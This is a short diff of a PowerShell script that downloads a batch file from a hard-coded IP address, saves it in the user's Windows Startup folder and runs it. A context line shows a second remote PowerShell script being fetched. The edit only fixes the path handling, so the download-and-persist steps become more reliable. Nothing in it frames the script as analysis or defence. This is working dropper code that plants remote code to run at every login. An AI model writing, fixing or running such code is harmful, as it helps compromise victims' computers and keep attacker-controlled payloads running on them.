@@ -13,6 +13,7 @@ $WebClient.DownloadFile("http://139.162.197.217:8080/raa.ps1","C:/Sys69/startup.
 Set-Location $curpath;
 Set-Location "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
 $startupdir = Get-Location;
-$WebClient.DownloadFile("http://139.162.197.217:8080/rouf.bat", $startupdir+"/rouf.bat");
-Start-Process -FilePath $startupdir+"/rouf.bat"
+$rouf = Join-Path -Path $startupdir -ChildPath "rouf.bat";
+$WebClient.DownloadFile("http://139.162.197.217:8080/rouf.bat", $rouf);
+Start-Process -FilePath $rouf
 
